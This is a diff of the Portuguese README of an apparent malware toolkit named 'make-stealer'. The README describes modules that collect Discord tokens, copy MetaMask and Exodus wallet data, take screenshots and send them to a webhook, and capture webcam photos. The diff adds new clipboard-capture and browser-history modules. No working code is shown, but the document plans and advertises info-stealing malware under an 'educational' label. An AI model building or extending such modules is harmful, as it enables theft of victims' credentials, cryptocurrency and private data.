@@ -23,6 +23,8 @@ Diversos módulos para implementação em Stealers. Desenvolvido para fins educa
 - **MetaMask & Exodus**: Cópia de dados de carteiras cripto
 - **Screenshot**: Captura de tela com envio para webhook
 - **Webcam**: Captura de foto da webcam
+- **Clipboard**: Captura todos os novos textos copiados pelo usuario e os antigos (caso tenha o win + v ativo)
+- **Browser History**: Coleta histórico dos navegadores
 
 ---
 
@@ -30,10 +32,12 @@ Diversos módulos para implementação em Stealers. Desenvolvido para fins educa
 
 ```
 make-stealer/
-├── index.js              # Arquivo principal
-├── package.json          # Dependências
+├── index.js             # Arquivo principal
+├── package.json         # Dependências
 ├── readme.MD            # Documentação
 └── modulos/             # Módulos do sistema
+    ├── clipboard.js     # Coleta clipboard
+    ├── browser.js       # Coleta histórico dos navegadores
     ├── discord.js       # Coleta tokens Discord
     ├── steam.js         # Backup Steam
     ├── metamask.js      # Backup MetaMask
